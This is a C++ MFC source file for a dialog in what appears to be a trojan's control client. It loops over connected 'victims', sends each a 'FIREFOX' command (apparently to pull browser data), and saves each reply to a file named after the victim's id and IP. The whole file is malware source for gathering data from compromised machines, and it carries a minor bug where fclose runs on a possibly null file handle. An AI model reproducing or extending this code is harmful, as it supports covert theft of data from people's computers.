// MassInfo.cpp : implementation file
//

#include "stdafx.h"
#include "client.h"
#include "MassInfo.h"
#include "net.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

/////////////////////////////////////////////////////////////////////////////
// CMassInfo dialog


CMassInfo::CMassInfo(CWnd* pParent /*=NULL*/)
	: CDialog(CMassInfo::IDD, pParent)
{
	//{{AFX_DATA_INIT(CMassInfo)
		// NOTE: the ClassWizard will add member initialization here
	//}}AFX_DATA_INIT
}


void CMassInfo::DoDataExchange(CDataExchange* pDX)
{
	CDialog::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CMassInfo)
	DDX_Control(pDX, IDC_FILE, m_File);
	DDX_Control(pDX, IDC_RECEIVED, m_Recived);
	DDX_Control(pDX, IDC_FROM, m_From);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CMassInfo, CDialog)
	//{{AFX_MSG_MAP(CMassInfo)
	//}}AFX_MSG_MAP
	ON_MESSAGE(WM_NEW_INFO_MESSAGE, OnInfoMessage)
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CMassInfo message handlers

BOOL CMassInfo::OnInitDialog() 
{
	int		i;

	CDialog::OnInitDialog();
	
	

	for (i = 0; i < victims; i++)
	{
		if (cndata[i].id > 0)
		{
			cndata[i].hWnd = GetSafeHwnd();
			NET_Send(i, FIREFOX, NULL);
		}
	}
	
	return TRUE;  // return TRUE unless you set the focus to a control
	              // EXCEPTION: OCX Property Pages should return FALSE
}

LRESULT CMassInfo::OnInfoMessage(UINT wParam, LONG lParam)
{
//	OutputText += NewText[wParam];
//	m_OutputScreen.SetWindowText(OutputText);

	char	buff[512], file[MAX_PATH];
	FILE	*f;

	_snprintf(buff, sizeof(buff) - 1, "(%d) %s (%s)", cndata[lParam].id, cndata[lParam].ip, cndata[lParam].name);
	m_From.SetWindowText(buff);

	_snprintf(file, sizeof(file) - 1, "%d-%s.txt", cndata[lParam].id, cndata[lParam].ip);
	m_File.SetWindowText(file);

	_snprintf(buff, sizeof(buff) - 1, "%s", NewText[wParam]);
	m_Recived.SetWindowText(buff);

	if (!strcmp(buff, "success\r\n") || !strcmp(buff, "failed\r\n"))
	{
		UpdateData(TRUE);
		return 0;
	}

	f = fopen(file, "ab");

	if (f != NULL)
		fputs(buff, f);

	fclose(f);

	UpdateData(TRUE);

	return 0;
}

void CMassInfo::OnCancel() 
{
	int		i;

	for (i = 0; i < victims; i++)
	{
		cndata[i].hWnd = NULL;
	}	

	CDialog::OnCancel();
}
